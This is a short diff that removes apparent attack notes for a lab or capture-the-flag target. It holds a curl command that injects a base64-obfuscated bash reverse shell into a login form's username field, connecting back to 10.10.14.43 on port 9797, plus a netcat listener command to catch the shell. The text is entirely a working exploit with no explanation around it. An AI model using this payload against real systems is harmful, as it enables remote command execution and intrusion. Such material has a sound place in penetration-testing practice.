@@ -1,5 +1,0 @@
-curl 'http://10.10.11.224:55555/memetpoke/login' \
-  --data 'username=;`echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQzLzk3OTcgMD4mMSAK" | base64 -d | bash`'
-
-
-listener : nc -lvnp 9797
